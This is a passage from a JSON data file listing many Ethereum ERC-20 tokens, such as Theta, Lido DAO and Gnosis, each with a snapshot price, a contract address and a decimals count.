    "address": "0xba11d00c5f74255f56a5e366f4f77f5a186d7f55",
    "decimals": "18"
}, {
    "name": "Elycoin (ELY)",
    "price": "0.00031337",
    "address": "0xa95592dcffa3c080b4b40e459c5f5692f67db7f8",
    "decimals": "18"
}, {
    "name": "Bulleon (BUL)",
    "price": "0.00020113",
    "address": "0x0775c81a273b355e6a5b76e240bf708701f00279",
    "decimals": "18"
}, {
    "name": "ContentBox Token (BOX)",
    "price": "0.00021607",
    "address": "0x63f584fa56e60e4d0fe8802b27c7e6e3b33e007f",
    "decimals": "18"
}, {
    "name": "HashCoin (HSC)",
    "price": "0.00000908",
    "address": "0x2bba3cf6de6058cc1b4457ce00deb359e2703d7f",
    "decimals": "18"
}, {
    "name": "Fetch (FET)",
    "price": "0.081511",
    "address": "0xaea46A60368A7bD060eec7DF8CBa43b7EF41Ad85",
    "decimals": "18"
}, {
    "name": "EKT (EKT)",
    "price": "0.00010286",
    "address": "0x4ecdb6385f3db3847f9c4a9bf3f9917bb27a5452",
    "decimals": "8"
}, {
    "name": "Populous (PPT)",
    "price": "0.074201",
    "address": "0xd4fa1460f537bb9085d22c7bccb5dd450ef28e3a",
    "decimals": "8"
}, {
    "name": "Cindicator (CND)",
    "price": "0.00054175",
    "address": "0xd4c435f5b09f855c3317c8524cb1f586e42795fa",
    "decimals": "18"
}, {
    "name": "Worldcore (WRC)",
    "price": "0.00004546",
    "address": "0x72adadb447784dd7ab1f472467750fc485e4cb2d",
    "decimals": "6"
}, {
    "name": "Mainframe Token (MFT)",
    "price": "0.00500573",
    "address": "0xdf2c7238198ad8b389666574f2d8bc411a4b7428",
    "decimals": "18"
}, {
    "name": "Bread (BRD)",
    "price": "0.01082868",
    "address": "0x558ec3152e2eb2174905cd19aea4e34a23de9ad6",
    "decimals": "18"
}, {
    "name": "MetaGraphChain (BKBT)",
    "price": "0.00000688",
    "address": "0x6a27348483d59150ae76ef4c0f3622a78b0ca698",
    "decimals": "18"
}, {
    "name": "Dock (DOCK)",
    "price": "0.02219817",
    "address": "0xe5dada80aa6477e85d09747f2842f7993d0df71c",
    "decimals": "18"
}, {
    "name": "Theta Token (THETA)",
    "price": "5.2666954",
    "address": "0x3883f5e181fccaf8410fa61e12b59bad963fb645",
    "decimals": "18"
}, {
    "name": "Bluzelle (BLZ)",
    "price": "0.085326",
    "address": "0x5732046a883704404f284ce41ffadd5b007fd668",
    "decimals": "18"
}, {
    "name": "1World (1WO)",
    "price": "0.101295",
    "address": "0xfdbc1adc26f0f8f8606a5d63b7d3a3cd21c22b23",
    "decimals": "8"
}, {
    "name": "SIRIN (SRN)",
    "price": "0.00280574",
    "address": "0x68d57c9a1c35f63e2c83ee8e49a64e9d70528d25",
    "decimals": "18"
}, {
    "name": "AidCoin (AID)",
    "price": "0.00157275",
    "address": "0x37e8789bb9996cac9156cd5f5fd32599e6b91289",
    "decimals": "18"
}, {
    "name": "MXCToken (MXC)",
    "price": "0.067548",
    "address": "0x5ca381bbfb58f0092df149bd3d243b08b9a8386e",
    "decimals": "18"
}, {
    "name": "MCO (MCO)",
    "price": "15.94713569",
    "address": "0xb63b606ac810a52cca15e44bb630fd42d8d1d83d",
    "decimals": "8"
}, {
    "name": "dYdX (DYDX)",
    "price": "1.25",
    "address": "0x92d6c1e31e14520e676a687f0a93788b716beff5",
    "decimals": "18"
}, {
    "name": "Measurable Data Token (MDT)",
    "price": "0.0263438",
    "address": "0x814e0908b12a99fecf5bc101bb5d0b8b5cdf7d26",
    "decimals": "18"
}, {
    "name": "Spell Token (SPELL)",
    "price": "0.00101093",
    "address": "0x090185f2135308bad17527004364ebcc2d37e5f6",
    "decimals": "18"
}, {
    "name": "Hydro Protocol (HOT)",
    "price": "0.001992",
    "address": "0x9af839687f6c94542ac5ece2e317daae355493a1",
    "decimals": "18"
}, {
    "name": "Walton (WTC)",
    "price": "0.313296",
    "address": "0xb7cb1c96db6b22b0d3d9536e0108d062bd488f74",
    "decimals": "18"
}, {
    "name": "Swipe (SXP)",
    "price": "0.35366",
    "address": "0x8ce9137d39326ad0cd6491fb5cc0cba0e089b6a9",
    "decimals": "18"
}, {
    "name": "BOB Token (BOB)",
    "price": "0.00184527",
    "address": "0xDF347911910b6c9A4286bA8E2EE5ea4a39eB2134",
    "decimals": "18"
}, {
    "name": "Ampleforth Governance (FORTH)",
    "price": "4.71",
    "address": "0x77fba179c79de5b7653f68b5039af940ada60ce0",
    "decimals": "18"
}, {
    "name": "SwftCoin (SWFTC)",
    "price": "0.00159051",
    "address": "0x0bb217e40f8a5cb79adf04e1aab60e5abd0dfc1e",
    "decimals": "8"
}, {
    "name": "RNTB Token (RNTB)",
    "price": "0.00002585",
    "address": "0x1fe70be734e473e5721ea57c8b5b01e6caa52686",
    "decimals": "18"
}, {
    "name": "0chain (ZCN)",
    "price": "0.118499",
    "address": "0xb9EF770B6A5e12E45983C5D80545258aA38F3B78",
    "decimals": "10"
}, {
    "name": "PHI Token (PHI)",
    "price": "0.06723205",
    "address": "0x13c2fab6354d3790d8ece4f0f1a3280b4a25ad96",
    "decimals": "18"
}, {
    "name": "RipioCreditNetwork (RCN)",
    "price": "0.00320192",
    "address": "0xf970b8e36e23f7fc3fd752eea86f8be8d83375a6",
    "decimals": "18"
}, {
    "name": "Veritaseum (VERI)",
    "price": "46.66",
    "address": "0x8f3470A7388c05eE4e7AF3d01D8C722b0FF52374",
    "decimals": "18"
}, {
    "name": "UniBright (UBT)",
    "price": "0.153492",
    "address": "0x8400d94a5cb0fa0d041a3788e395285d61c9ee5e",
    "decimals": "8"
}, {
    "name": "Zilliqa (ZIL)",
    "price": "0.03143957",
    "address": "0x05f4a42e251f2d52b8ed15e9fedaacfcef1fad27",
    "decimals": "12"
}, {
    "name": "CEEK (CEEK)",
    "price": "0.146359",
    "address": "0xb056c38f6b7dc4064367403e26424cd2c60655e1",
    "decimals": "18"
}, {
    "name": "Medical Token Currency (MTC)",
    "price": "0.00185937",
    "address": "0x905e337c6c8645263d3521205aa37bf4d034e745",
    "decimals": "18"
}, {
    "name": "MATRIX AI Network (MAN)",
    "price": "0.00617892",
    "address": "0xe25bcec5d3801ce3a794079bf94adf1b8ccd802d",
    "decimals": "18"
}, {
    "name": "Arcona Distribution Contract (ARCONA)",
    "price": "0.066662",
    "address": "0x0f71b8de197a1c84d31de0f1fa7926c365f052b3",
    "decimals": "18"
}, {
    "name": "All Sports Coin (SOC)",
    "price": "0.00247016",
    "address": "0x2d0e95bd4795d7ace0da3c0ff7b706a5970eb9d3",
    "decimals": "18"
}, {
    "name": "TokenClub Token (TCT)",
    "price": "0.00678297",
    "address": "0x4824a7b64e3966b0133f4f4ffb1b9d6beb75fff7",
    "decimals": "18"
}, {
    "name": "Tierion Network Token (TNT)",
    "price": "0.00331401",
    "address": "0x08f5a9235b08173b7569f83645d2c7fb55e8ccd8",
    "decimals": "8"
}, {
    "name": "Rarible (RARI)",
    "price": "2.26",
    "address": "0xfca59cd816ab1ead66534d82bc21e7515ce441cf",
    "decimals": "18"
}, {
    "name": "Cortex Coin (CTXC)",
    "price": "0.10899656",
    "address": "0xea11755ae41d889ceec39a63e6ff75a02bc1c00d",
    "decimals": "18"
}, {
    "name": "savedroid (SVD)",
    "price": "0.00010131",
    "address": "0xbdeb4b83251fb146687fa19d1c660f99411eefe3",
    "decimals": "18"
}, {
    "name": "PILLAR (PLR)",
    "price": "0.00471348",
    "address": "0xe3818504c1b32bf1557b16c238b2e01fd3149c17",
    "decimals": "18"
}, {
    "name": "CyberMiles (CMT)",
    "price": "0.00217859",
    "address": "0xf85feea2fdd81d51177f6b8f35f0e6734ce45f5f",
    "decimals": "18"
}, {
    "name": "Illuvium (ILV)",
    "price": "57.38",
    "address": "0x767fe9edc9e0df98e07454847909b5e959d7ca0e",
    "decimals": "18"
}, {
    "name": "ESSENTIA (ESS)",
    "price": "0.00031632",
    "address": "0xfc05987bd2be489accf0f509e44b0145d68240f7",
    "decimals": "18"
}, {
    "name": "BANCA (BANCA)",
    "price": "0.00001206",
    "address": "0x998b3b82bc9dba173990be7afb772788b5acb8bd",
    "decimals": "18"
}, {
    "name": "BlitzPredict (XBP)",
    "price": "0.0003179",
    "address": "0x28dee01d53fed0edf5f6e310bf8ef9311513ae40",
    "decimals": "18"
}, {
    "name": "DIAToken (DIA)",
    "price": "0.406558",
    "address": "0x84cA8bc7997272c7CfB4D0Cd3D55cd942B3c9419",
    "decimals": "18"
}, {
    "name": "pSTAKE Finance (PSTAKE)",
    "price": "0.137623",
    "address": "0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006",
    "decimals": "18"
}, {
    "name": "Lido DAO Token (LDO)",
    "price": "1.52",
    "address": "0x5a98fcbea516cf06857215779fd812ca3bef1b32",
    "decimals": "18"
}, {
    "name": "Gitcoin (GTC)",
    "price": "1.84",
    "address": "0xde30da39c46104798bb5aa3fe8b9e0e1f348163f",
    "decimals": "18"
}, {
    "name": "IoTeX Network (IOTX)",
    "price": "0.02848429",
    "address": "0x6fb3e0a217407efff7ca062d46c26e5d60a14d69",
    "decimals": "18"
}, {
    "name": "RLC (RLC)",
    "price": "1.26",
    "address": "0x607F4C5BB672230e8672085532f7e901544a7375",
    "decimals": "9"
}, {
    "name": "Bounty0x (BNTY)",
    "price": "0.00079866",
    "address": "0xd2d6158683aee4cc838067727209a0aaf4359de3",
    "decimals": "18"
}, {
    "name": "BOX Token (BOX)",
    "price": "0.00499732",
    "address": "0xe1A178B681BD05964d3e3Ed33AE731577d9d96dD",
    "decimals": "18"
}, {
    "name": "IOT Chain (ITC)",
    "price": "0.0004048",
    "address": "0x5e6b6d9abad9093fdc861ea1600eba1b355cd940",
    "decimals": "18"
}, {
    "name": "ZBToken (ZB)",
    "price": "0.20516",
    "address": "0xbd0793332e9fb844a52a205a233ef27a5b34b927",
    "decimals": "18"
}, {
    "name": "SKALE (SKL)",
    "price": "0.03923635",
    "address": "0x00c83aecc790e8a4453e5dd3b0b4b3680501a7a7",
    "decimals": "18"
}, {
    "name": "Cobinhood (COB)",
    "price": "0.00020113",
    "address": "0xb2f7eb1f2c37645be61d73953035360e768d81e6",
    "decimals": "18"
}, {
    "name": "Paxos Gold (PAXG)",
    "price": "1702.85",
    "address": "0x45804880De22913dAFE09f4980848ECE6EcbAf78",
    "decimals": "18"
}, {
    "name": "Presearch (PRE)",
    "price": "0.064308",
    "address": "0xEC213F83defB583af3A000B1c0ada660b1902A0F",
    "decimals": "18"
}, {
    "name": "Po.et (POE)",
    "price": "0.00002324",
    "address": "0x0e0989b1f9b8a38983c2ba8053269ca62ec9b195",
    "decimals": "8"
}, {
    "name": "UNetworkToken (UUU)",
    "price": "0.00002819",
    "address": "0x3543638ed4a9006e4840b105944271bcea15605d",
    "decimals": "18"
}, {
    "name": "DAV Token (DAV)",
    "price": "0.00074935",
    "address": "0xd82df0abd3f51425eb15ef7580fda55727875f14",
    "decimals": "18"
}, {
    "name": "UMA Voting Token v1 (UMA)",
    "price": "2.30",
    "address": "0x04Fa0d235C4abf4BcF4787aF4CF447DE572eF828",
    "decimals": "18"
}, {
    "name": "Faceter (FACE)",
    "price": "0.00043952",
    "address": "0x1ccaa0f2a7210d76e1fdec740d5f323e2e1b1672",
    "decimals": "18"
}, {
    "name": "Stox (STX)",
    "price": "0.00375545",
    "address": "0x006bea43baa3f7a6f765f14f10a1a1b08334ef45",
    "decimals": "18"
}, {
    "name": "ArcBlock (ABT)",
    "price": "0.13548",
    "address": "0xb98d4c97425d9908e66e53a6fdf673acca0be986",
    "decimals": "18"
}, {
    "name": "pTokens SAFEMOON (pSAFEMOON)",
    "price": "0.00000001",
    "address": "0x16631e53c20fd2670027c6d53efe2642929b285c",
    "decimals": "18"
}, {
    "name": "SENTINEL PROTOCOL (UPP)",
    "price": "0.062375",
    "address": "0xc86d054809623432210c107af2e3f619dcfbf652",
    "decimals": "18"
}, {
    "name": "SwissBorg (CHSB)",
    "price": "0.198619",
    "address": "0xba9d4199fab4f26efe3551d490e3821486f135ba",
    "decimals": "8"
}, {
    "name": "CREDITS (CS)",
    "price": "0.00490682",
    "address": "0x46b9ad944d1059450da1163511069c718f699d31",
    "decimals": "6"
}, {
    "name": "BitDAO (BIT)",
    "price": "0.479497",
    "address": "0x1a4b46696b2bb4794eb3d4c26f1c55f9170fa4c5",
    "decimals": "18"
}, {
    "name": "EchoLink (EKO)",
    "price": "0.00009541",
    "address": "0xa6a840e50bcaa50da017b91a0d86b8b2d41156ee",
    "decimals": "18"
}, {
    "name": "Bloom (BLT)",
    "price": "0.02323129",
    "address": "0x107c4504cd79c5d2696ea0030a8dd4e92601b82e",
    "decimals": "18"
}, {
    "name": "indaHash Coin (IDH)",
    "price": "0.00107308",
    "address": "0x5136c98a80811c3f46bdda8b5c4555cfd9f812f0",
    "decimals": "6"
}, {
    "name": "BLOCKMASON CREDIT PROTOCOL TOKEN (BCPT)",
    "price": "0.00244611",
    "address": "0x1c4481750daa5ff521a2a7490d9981ed46465dbd",
    "decimals": "18"
}, {
    "name": "Rate3 (RTE)",
    "price": "0.00002971",
    "address": "0x436f0f3a982074c4a05084485d421466a994fe53",
    "decimals": "18"
}, {
    "name": "Tripio (TRIO)",
    "price": "0.00005785",
    "address": "0x8b40761142b9aa6dc8964e61d0585995425c3d94",
    "decimals": "18"
}, {
    "name": "NKN (NKN)",
    "price": "0.092006",
    "address": "0x5cf04716ba20127f1e2297addcf4b5035000c9eb",
    "decimals": "18"
}, {
    "name": "CarryToken (CRE)",
    "price": "0.00403205",
    "address": "0x115ec79f1de567ec68b7ae7eda501b406626478e",
    "decimals": "18"
}, {
    "name": "Bee (BEE)",
    "price": "0.00041523",
    "address": "0x4d8fc1453a0f359e99c9675954e656d80d996fbf",
    "decimals": "18"
}, {
    "name": "Egretia (EGT)",
    "price": "0.00039661",
    "address": "0x8e1b448ec7adfc7fa35fc2e885678bd323176e34",
    "decimals": "18"
}, {
    "name": "MEDIBIT (MEDIBIT)",
    "price": "0.0000002",
    "address": "0x737fa0372c8d001904ae6acaf0552d4015f9c947",
    "decimals": "18"
}, {
    "name": "Lambda (LAMB)",
    "price": "0.00174421",
    "address": "0x8971f9fd7196e5cee2c1032b50f656855af7dd26",
    "decimals": "18"
}, {
    "name": "ATN (ATN)",
    "price": "0.01485871",
    "address": "0x461733c17b0755ca5649b6db08b3e213fcf22546",
    "decimals": "18"
}, {
    "name": "OVR (OVR)",
    "price": "0.660868",
    "address": "0x21bfbda47a0b4b5b1248c767ee49f7caa9b23697",
    "decimals": "18"
}, {
    "name": "WAX Token (WAX)",
    "price": "0.08557201",
    "address": "0x39bb259f66e1c59d5abef88375979b4d20d98022",
    "decimals": "8"
}, {
    "name": "SPINDLE (SPD)",
    "price": "0.00006687",
    "address": "0x1dea979ae76f26071870f824088da78979eb91c8",
    "decimals": "18"
}, {
    "name": "WaBi (WaBi)",
    "price": "0.11754",
    "address": "0x286BDA1413a2Df81731D4930ce2F862a35A609fE",
    "decimals": "18"
}, {
    "name": "DappRadar (RADAR)",
    "price": "0.007243",
    "address": "0x44709a920fccf795fbc57baa433cc3dd53c44dbe",
    "decimals": "18"
}, {
    "name": "Alchemy (ACH)",
    "price": "0.01168484",
    "address": "0xed04915c23f00a313a544955524eb7dbd823143d",
    "decimals": "8"
}, {
    "name": "Dusk Network (DUSK)",
    "price": "0.131007",
    "address": "0x940a2db1b7008b6c776d4faaca729d6d4a4aa551",
    "decimals": "18"
}, {
    "name": "CelerToken (CELR)",
    "price": "0.01560111",
    "address": "0x4f9254c83eb525f9fcf346490bbb3ed28a81c667",
    "decimals": "18"
}, {
    "name": "Raiden (RDN)",
    "price": "0.053031",
    "address": "0x255aa6df07540cb5d3d297f0d0d4d84cb52bc8e6",
    "decimals": "18"
}, {
    "name": "Pundi X Token (PUNDIX)",
    "price": "0.497146",
    "address": "0x0fd10b9899882a6f2fcb5c371e17e70fdee00c38",
    "decimals": "18"
}, {
    "name": "Trace (TRAC)",
    "price": "0.182046",
    "address": "0xaa7a9ca87d3694b5755f213b5d04094b8d0f0a6f",
    "decimals": "18"
}, {
    "name": "PumaPay (PMA)",
    "price": "0.00002526",
    "address": "0x846c66cf71c43f80403b51fe3906b3599d63336f",
    "decimals": "18"
}, {
    "name": "Golem Network Token (GLM)",
    "price": "0.26569307",
    "address": "0x7DD9c5Cba05E151C895FDe1CF355C9A1D5DA6429",
    "decimals": "18"
}, {
    "name": "NeuroToken (NTK)",
    "price": "0.00151917",
    "address": "0x69beab403438253f13b6e92db91f7fb849258263",
    "decimals": "18"
}, {
    "name": "Polkamon (PMON)",
    "price": "1.28",
    "address": "0x1796ae0b0fa4862485106a0de9b654efe301d0b2",
    "decimals": "18"
}, {
    "name": "Gnosis (GNO)",
    "price": "115.54",
    "address": "0x6810e776880c02933d47db1b9fc05908e5386b96",
    "decimals": "18"
}, {
    "name": "Armor (ARMOR)",
    "price": "0.00579437",
    "address": "0x1337def16f9b486faed0293eb623dc8395dfe46a",
    "decimals": "18"
}, {
    "name": "SP8DE Token (SPX)",
    "price": "0.0000444",
    "address": "0x05aaaa829afa407d83315cded1d45eb16025910c",
    "decimals": "18"
}, {
    "name": "BitTorrent (BTT)",
    "price": "0.0000008",
    "address": "0xc669928185dbce49d2230cc9b0979be6dc797957",
    "decimals": "18"
}, {
    "name": "Render Token (RNDR)",
    "price": "0.48312",
    "address": "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24",
    "decimals": "18"
}, {
    "name": "Centra (CTR)",
    "price": "0.0164787",
    "address": "0x96A65609a7B84E8842732DEB08f56C3E21aC6f8a",
    "decimals": "18"
}, {
    "name": "Couchain (COU)",
    "price": "0.00000037",
    "address": "0xf091cf09c51811819db705710e9634b8bf18f164",
    "decimals": "18"
}, {
    "name": "DWS (DWS)",
    "price": "0.00041438",
    "address": "0xf4b54874cd8a6c863e3a904c18fda964661ec363",
    "decimals": "18"
}, {
    "name": "UBEX Token (UBEX)",
    "price": "0.00002785",
    "address": "0x6704b673c70de9bf74c8fba4b4bd748f0e2190e1",
    "decimals": "18"
}, {
    "name": "BTOCoin (BTO)",
    "price": "0.00054332",
    "address": "0x36905fc93280f52362a1cbab151f25dc46742fb5",
    "decimals": "18"
}, {
    "name": "Knoxstertoken (FKX)",
    "price": "0.03370573",
    "address": "0x16484d73Ac08d2355F466d448D2b79D2039F6EBB",
    "decimals": "18"
}, {
    "name": "Parsiq Token (PRQ)",
    "price": "0.104656",
    "address": "0x362bc847A3a9637d3af6624EeC853618a43ed7D2",
    "decimals": "18"
}, {
    "name": "LikeCoin (LIKE)",
    "price": "0.00309425",
    "address": "0x02f61fd266da6e8b102d4121f5ce7b992640cf98",
    "decimals": "18"
}, {
    "name": "BANKEX (BKX)",
    "price": "0.00000807",
    "address": "0x45245bc59219eeaaf6cd3f382e078a461ff9de7b",
    "decimals": "18"
}, {
    "name": "UChain Token (UCN)",
    "price": "0.00001334",
    "address": "0xaaf37055188feee4869de63464937e683d61b2a1",
    "decimals": "18"
}, {
    "name": "MediShares (MDS)",
    "price": "0.00034444",
    "address": "0x66186008C1050627F979d464eABb258860563dbE",
    "decimals": "18"
}, {
    "name": "UCOT (UCT)",
    "price": "0.00257366",
    "address": "0x3c4bEa627039F0B7e7d21E34bB9C9FE962977518",
    "decimals": "18"
}, {
    "name": "MobileGo (MGO)",
    "price": "0.00610419",
    "address": "0x40395044Ac3c0C57051906dA938B54BD6557F212",
    "decimals": "8"
}, {
    "name": "Primas Token (PST)",
    "price": "0.01036378",
    "address": "0x5d4abc77b8405ad177d8ac6682d584ecbfd46cec",
    "decimals": "18"
}, {
    "name": "Smart Advertising Transaction Token (SATT)",
    "price": "0.00139833",
    "address": "0xdf49c9f599a0a9049d97cff34d0c30e468987389",
    "decimals": "18"
}, {
    "name": "ODEM Token (ODEM)",
    "price": "0.00105153",
    "address": "0xbf52f2ab39e26e0951d2a02b49b7702abe30406a",
    "decimals": "18"
}, {
    "name": "Shopping.io (SPI)",
    "price": "0.08843",
    "address": "0x9b02dd390a603add5c07f9fd9175b7dabe8d63b7",
    "decimals": "18"
}, {
    "name": "DigitexFutures (DGTX)",
    "price": "0.0000226",
    "address": "0xc666081073E8DfF8D3d1c2292A29aE1A2153eC09",
    "decimals": "18"
}, {
    "name": "Volt Inu (VOLT)",
    "price": "0.00000058",
    "address": "0x7db5af2b9624e1b3b4bb69d6debd9ad1016a58ac",
    "decimals": "9"
}, {
    "name": "ICONOMI (ICN)",
    "price": "0.21673356",
    "address": "0x888666CA69E0f178DED6D75b5726Cee99A87D698",
    "decimals": "18"
}, {
    "name": "Nebulas (NAS)",
    "price": "0.03917538",
    "address": "0x5d65D971895Edc438f465c17DB6992698a52318D",
    "decimals": "18"
}, {
    "name": "PayPie (PPP)",
    "price": "0.00636819",
    "address": "0xc42209aCcC14029c1012fB5680D95fBd6036E2a0",
    "decimals": "18"
}, {
    "name": "SelfKey (KEY)",
    "price": "0.00439056",
    "address": "0x4cc19356f2d37338b9802aa8e8fc58b0373296e7",
    "decimals": "18"
}, {
    "name": "Synth sUSD (sUSD)",
    "price": "1.009",
    "address": "0x57ab1ec28d129707052df4df418d58a2d46d5f51",
    "decimals": "18"
}, {
    "name": "Spice (SFI)",
    "price": "44.71",
    "address": "0xb753428af26e81097e7fd17f40c88aaa3e04902c",
    "decimals": "18"
}, {
    "name": "0xcert Protocol Token (ZXC)",
    "price": "0.00017375",
    "address": "0x83e2be8d114f9661221384b3a50d24b96a5653f5",
    "decimals": "18"
}, {
    "name": "Netkoin (NTK)",
    "price": "0.00001149",
    "address": "0x5d4d57cd06fa7fe99e26fdc481b468f77f05073c",
    "decimals": "18"
}, {
    "name": "Kcash (KCASH)",
    "price": "0.00114276",
    "address": "0x32d74896f05204d1b6ae7b0a3cebd7fc0cd8f9c7",
    "decimals": "18"
}, {
    "name": "StarterCoin (STAC)",
    "price": "0.00002784",
    "address": "0x9a005c9a89bd72a4bd27721e7a09a3c11d2b03c4",
    "decimals": "18"
}, {
    "name": "CocosToken (COCOS)",
    "price": "0.61251794",
    "address": "0x0c6f5f7d555e7518f6841a79436bd2b1eef03381",
    "decimals": "18"
}, {
    "name": "Stader (SD)",
    "price": "0.33054991",
    "address": "0x30d20208d987713f46dfd34ef128bb16c404d10f",
    "decimals": "18"
}, {
    "name": "DEXTools (DEXT)",
    "price": "0.119117",
    "address": "0xfb7b4564402e5500db5bb6d63ae671302777c75a",
    "decimals": "18"
}, {
    "name": "ChangeNOW (NOW)",
    "price": "0.04358746",
    "address": "0xe9a95d175a5f4c9369f3b74222402eb1b837693b",
    "decimals": "8"
}, {
    "name": "YOU Chain (YOU)",
    "price": "0.00170007",
    "address": "0x34364BEe11607b1963d66BCA665FDE93fCA666a8",
    "decimals": "18"
}, {
    "name": "STPT (STPT)",
    "price": "0.04251828",
    "address": "0xde7d85157d9714eadf595045cc12ca4a5f3e2adb",
    "decimals": "18"
}, {
    "name": "AiLink Token (ALI)",
    "price": "0.0000154",
    "address": "0x4289c043a12392f1027307fb58272d8ebd853912",
    "decimals": "18"
}, {
    "name": "Guaranteed Entrance Token (GET)",
    "price": "1.64",
    "address": "0x8a854288a5976036a725879164ca3e91d30c6a1b",
    "decimals": "18"
}, {
    "name": "PalletOneToken (PTN)",
    "price": "0.00039977",
    "address": "0xfe76be9cec465ed3219a9972c21655d57d21aec6",
    "decimals": "18"
}, {
    "name": "NANJCOIN (NANJ)",
    "price": "0.00002549",
    "address": "0xffe02ee4c69edf1b340fcad64fbd6b37a7b9e265",
    "decimals": "8"
}, {
    "name": "CoinDash Token (CDT)",
    "price": "0.107313",
    "address": "0x177d39ac676ed1c67a2b268ad7f1e58826e5b0af",
    "decimals": "18"
}, {
    "name": "Hop (HOP)",
    "price": "0.134698",
    "address": "0xc5102fe9359fd9a28f877a67e36b0f050d81a3cc",
    "decimals": "18"
}, {
    "name": "Cappasity (CAPP)",
    "price": "0.00041457",
    "address": "0x04f2e7221fdb1b52a68169b25793e51478ff0329",
    "decimals": "2"
}, {
    "name": "Tribe (TRIBE)",
    "price": "0.21869563",
    "address": "0xc7283b66eb1eb5fb86327f08e1b5816b0720212b",
    "decimals": "18"
}, {
    "name": "GoToken (GOT)",
    "price": "0.00077297",
    "address": "0x423b5f62b328d0d6d44870f4eee316befa0b2df5",
    "decimals": "18"
}, {
    "name": "Proton (XPR)",
    "price": "0.00226162",
    "address": "0xD7EFB00d12C2c13131FD319336Fdf952525dA2af",
    "decimals": "4"
}, {
    "name": "Aragon Network Token (ANT)",
    "price": "1.71",
    "address": "0xa117000000f279d81a1d3cc75430faa017fa5a2e",
    "decimals": "18"
}, {
    "name": "PolkaBridge (PBR)",
    "price": "0.07424",
    "address": "0x298d492e8c1d909d3f63bc4a36c66c64acb3d695",
    "decimals": "18"
}, {
    "name": "cVToken (cV)",
    "price": "0.00021345",
    "address": "0x50bC2Ecc0bfDf5666640048038C1ABA7B7525683",
    "decimals": "18"
}, {
    "name": "PAID Network (PAID)",
    "price": "0.02380104",
    "address": "0x1614f18fc94f47967a3fbe5ffcd46d4e7da3d787",
    "decimals": "18"
}, {
    "name": "QASH (QASH)",
    "price": "0.02416644",
    "address": "0x618e75ac90b12c6049ba3b27f5d5f8651b0037f6",
    "decimals": "6"
}, {
    "name": "DEBITUM (DEB)",
    "price": "0.00067095",
    "address": "0x151202c9c18e495656f372281f493eb7698961d5",
    "decimals": "18"
}, {
    "name": "Insights Network (INSTAR)",
    "price": "0.0848911",
    "address": "0xc72fe8e3dd5bef0f9f31f259399f301272ef2a2d",
    "decimals": "18"
}, {
    "name": "Metal (MTL)",
    "price": "1.059",
    "address": "0xF433089366899D83a9f26A773D59ec7eCF30355e",
    "decimals": "8"
}, {
    "name": "Cashaa (CAS)",
    "price": "0.00798691",
    "address": "0xe8780b48bdb05f928697a5e8155f672ed91462f7",
    "decimals": "18"
}, {
    "name": "DODO bird (DODO)",
    "price": "0.131705",
    "address": "0x43Dfc4159D86F3A37A5A4B3D4580b888ad7d4DDd",
    "decimals": "18"
}, {
    "name": "Aditus (ADI)",
    "price": "0.00019174",
    "address": "0x8810c63470d38639954c6b41aac545848c46484a",
    "decimals": "18"
}, {
    "name": "AirSwap (AST)",
    "price": "0.139229",
    "address": "0x27054b13b1b798b345b591a4d22e6562d47ea75a",
    "decimals": "4"
}, {
    "name": "Gems (GEM)",
    "price": "0.0001263",
    "address": "0xc7bba5b765581efb2cdd2679db5bea9ee79b201f",
    "decimals": "18"
}, {
    "name": "Simple Token (ST)",
    "price": "0.00045985",
    "address": "0x2c4e8f2d746113d0696ce89b35f0d8bf88e0aeca",
    "decimals": "18"
}, {
    "name": "Omix (OMX)",
    "price": "0.00018507",
    "address": "0xb5dbc6d3cf380079df3b27135664b6bcf45d1869",
    "decimals": "8"
}, {
    "name": "LCX (LCX)",
    "price": "0.05506",
    "address": "0x037a54aab062628c9bbae1fdb1583c195585fe41",
    "decimals": "18"
}, {
    "name": "Guppy (Guppy)",
    "price": "0.00057381",
    "address": "0xf7b098298f7c69fc14610bf71d5e02c60792894c",
    "decimals": "3"
}, {
    "name": "UnFederalReserveToken (eRSDL)",
    "price": "0.00556964",
    "address": "0x5218E472cFCFE0b64A064F055B43b4cdC9EfD3A6",
    "decimals": "18"
}, {
    "name": "UTN-P: Universa Token (UTNP)",
    "price": "0.00371388",
    "address": "0x9e3319636e2126e3c0bc9e3134aec5e1508a46c7",
    "decimals": "18"
}, {
    "name": "SNGLS (SNGLS)",
    "price": "0.00027778",
    "address": "0xaec2e87e0a235266d9c5adc9deb4b2e29b54d009",
    "decimals": "0"
}, {
    "name": "Virtue Player Points (VPP)",
    "price": "0.00695238",
    "address": "0x5eeaa2dcb23056f4e8654a349e57ebe5e76b5e6e",
    "decimals": "18"
}, {
    "name": "MATH Token (MATH)",
    "price": "0.110193",
    "address": "0x08d967bb0134f2d07f7cfb6e246680c53927dd30",
    "decimals": "18"
}, {
    "name": "Kryll (KRL)",
    "price": "0.366203",
    "address": "0x464ebe77c293e473b48cfe96ddcf88fcf7bfdac0",
    "decimals": "18"
}, {
    "name": "Propy (PRO)",
    "price": "0.613799",
    "address": "0x226bb599a12c826476e3a771454697ea52e9e220",
    "decimals": "8"
}, {
    "name": "Zipper (ZIP)",
    "price": "0.0000039",
    "address": "0xa9d2927d3a04309e008b6af6e2e282ae2952e7fd",
    "decimals": "18"
}, {
    "name": "Wootrade Network (WOO)",
    "price": "0.142763",
    "address": "0x4691937a7508860f876c9c0a2a617e7d9e945d4b",
    "decimals": "18"
}, {
    "name": "Paint (PAINT)",
    "price": "0.00003724",
    "address": "0x4c6ec08cf3fc987c6c4beb03184d335a2dfc4042",
    "decimals": "18"
}, {
    "name": "Spendcoin (SPND)",
    "price": "0.00265059",
    "address": "0xddd460bbd9f79847ea08681563e8a9696867210c",
    "decimals": "18"
}, {
    "name": "Datum (DAT)",
    "price": "0.0000943",
    "address": "0x81c9151de0c8bafcd325a57e3db5a5df1cebf79c",
    "decimals": "18"
}, {
    "name": "Mass Vehicle Ledger Token (MVL)",
    "price": "0.00462352",
    "address": "0xa849eaae994fb86afa73382e9bd88c2b6b18dc71",
    "decimals": "18"
}, {
    "name": "Student Coin (STC)",
    "price": "0.00337895",
    "address": "0x15b543e986b8c34074dfc9901136d9355a537e7e",
    "decimals": "18"
}, {
    "name": "Skrumble Network V2 (SKM)",
    "price": "0.00050346",
    "address": "0x048fe49be32adfc9ed68c37d32b5ec9df17b3603",
    "decimals": "18"
}, {
    "name": "Kyber Network Crystal v2 (KNC)",
    "price": "1.14",
    "address": "0xdeFA4e8a7bcBA345F687a2f1456F5Edd9CE97202",
    "decimals": "18"
}, {
    "name": "HitchainCoin (HIT)",
    "price": "0.00000954",
